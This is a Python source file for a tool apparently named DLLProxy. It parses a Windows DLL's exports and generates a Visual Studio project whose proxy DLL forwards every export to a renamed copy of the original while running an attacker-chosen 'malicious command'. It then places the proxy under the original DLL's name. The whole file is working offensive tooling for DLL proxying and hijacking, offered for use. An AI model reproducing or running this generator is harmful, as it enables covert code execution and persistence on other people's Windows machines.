#!/usr/bin/python3

import argparse
import logging
import os
import pereader
import random
import shutil
import templates

# Logging config
logging.basicConfig(format = '\r[%(asctime)s] %(name)-20s %(levelname)-9s %(message)s')
logger = logging.getLogger('')

def randstr(n):
	charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	return ''.join([random.choice(list(charset)) for i in range(n)])


def genVSProject(newName, origName, maliciousCmd):

	# rename original DLL to "orig" name
	orig_dll = pereader.PE(origName)
	newName = newName[:-4]
	dll_petype = orig_dll.OPTIONAL_HEADER.Magic
	bitness = 64 if dll_petype == pereader.NT_OPTIONAL_HDR64_MAGIC else 32
	logger.info('input DLL is %d-bits' % bitness)

	PRAGMA_COMMENTS = {}
	for export in orig_dll.directory_entry_export.symbols.symbols:
		if export.name == '':
			while export.name == '' or export.name in PRAGMA_COMMENTS.keys():
				export.name = randstr(8)
				export.origname = f'#{export.ordinal}'

		else:
			export.origname = export.name

		PRAGMA_COMMENTS[export.name] = f'#pragma comment(linker, "/export:{export.name}={newName}.{export.origname},@{export.ordinal}")'


	with open('DllProxy\\dllmain.h', 'w') as hFile:
		hFile.write(templates.DLLMAIN_H % {'MALICIOUS_CMD': maliciousCmd, 'PRAGMA_COMMENTS': '\n'.join(PRAGMA_COMMENTS.values())})

	return bitness


if __name__ == '__main__':

	# args definition
	ap = argparse.ArgumentParser()
	ap.add_argument('--malicious-cmd', '-m', dest='malicious_cmd', required=False, default='C:\\Windows\\System32\\calc.exe')
	ap.add_argument('--verbose', '-v', action='store_true', default=False)
	ap.add_argument('DLL')
	args = ap.parse_args()

	# handle args
	# verbosity
	logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)
	logger.info('welcome to DLLProxy!')


	origDll = args.DLL
	newDll = 'p-' + os.path.basename(origDll)

	malicious_cmd = args.malicious_cmd.replace('\\', '\\\\')
	malicious_cmd = malicious_cmd.replace('"', '\"')
	bitness = genVSProject(newDll, origDll, malicious_cmd)
	platform = 'x64' if bitness==64 else 'x86'

	WARNING = f'Open solution file within Visual Studio and build the solution:\n'
	WARNING+= f' * Configuration: Release\n'
	WARNING+= f' * Platform: {platform}\n\n'
	WARNING+= f'Press [ENTER] after successful build\n'
	input(WARNING)

	OUTPUT_DIR = 'dist'
	VS_BUILD_DIR = 'Release' if bitness==32 else os.path.join('x64','Release')
	VS_DLLNAME = 'DllProxy.dll'

	if not os.path.isdir(OUTPUT_DIR):
		os.mkdir(OUTPUT_DIR)

	
	built_proxy_dll = os.path.join(VS_BUILD_DIR, VS_DLLNAME)
	dist_proxy_dll = os.path.join(OUTPUT_DIR, origDll)
	dist_proxied_dll = os.path.join(OUTPUT_DIR, newDll)

	shutil.copy(origDll, dist_proxied_dll)
	shutil.copy(built_proxy_dll, dist_proxy_dll)